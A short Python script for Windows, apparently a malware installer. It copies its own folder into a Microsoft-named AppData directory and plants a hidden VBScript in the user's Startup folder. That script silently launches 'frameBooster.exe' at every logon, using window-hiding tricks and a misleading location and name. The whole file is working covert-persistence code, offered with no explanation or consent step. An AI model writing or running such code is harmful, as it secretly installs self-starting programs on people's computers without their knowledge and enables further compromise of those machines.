import getpass
import os
import subprocess
USER_NAME = getpass.getuser()


file_path = os.path.dirname(os.path.realpath(__file__))
with open(file_path +"\\" +'cd.bat', "w+") as cd_file:
    cd_file.write('xcopy '+ file_path +r' C:\Users\%s\AppData\Local\Microsoft /e /i /y' % USER_NAME)
with open(file_path +"\\" +'cd2.bat', "w+") as cd2_file:
    cd2_file.write('start /min cmd /c '+ file_path +'\cd.bat')
subprocess.call(file_path+"\cd2.bat")

file_path = os.path.dirname(os.path.realpath(__file__))
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(file_path +"\\" +'start.bat', "w+") as start_file:
    start_path = r' C:\Users\%s\AppData\Local\Microsoft' % USER_NAME + "\\frameBooster.exe"
    start_file.write(r'start '+ start_path)
with open(bat_path + '\\' + "invisible.vbs", "w+") as bat_file:
    bat_file.write('Set oWShell = CreateObject("Wscript.Shell") \n')
    bat_file.write(r'oWShell.Run """'+r'C:\Users\%s\AppData\Local\Microsoft' % USER_NAME +'\start.bat""", 0, False \n')
    bat_file.write(r'Set oWSHell = Nothing')
